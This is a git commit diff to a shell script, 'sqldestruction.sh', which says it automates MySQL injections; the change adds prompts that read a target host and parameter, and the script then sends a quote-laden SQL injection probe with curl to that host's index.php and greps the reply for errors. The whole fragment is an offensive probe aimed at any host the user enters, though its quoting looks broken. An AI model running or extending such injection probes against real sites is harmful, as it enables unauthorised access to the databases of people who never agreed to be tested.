86153a1021fcacd2bb9cff6cea0c8de51f5debec
H1sok4 <88634883+H1sok444@users.noreply.github.com>
2025-05-17 02:44:22 +0100

    Update sqldestruction.sh

--- SQL Injection/sqldestruction.sh
+++ SQL Injection/sqldestruction.sh
@@ -2,8 +2,9 @@
 # This is a script that is made to automate mysql injections
 
 echo "Enter the host info (ip/domain)" 
+read host
 echo "Submit the the vulnerable/suspected parameter"
-
+read p
 # Triggering an error
 curl "$host/index.php?{$p}=' "' %'-- -"" | grep error
 
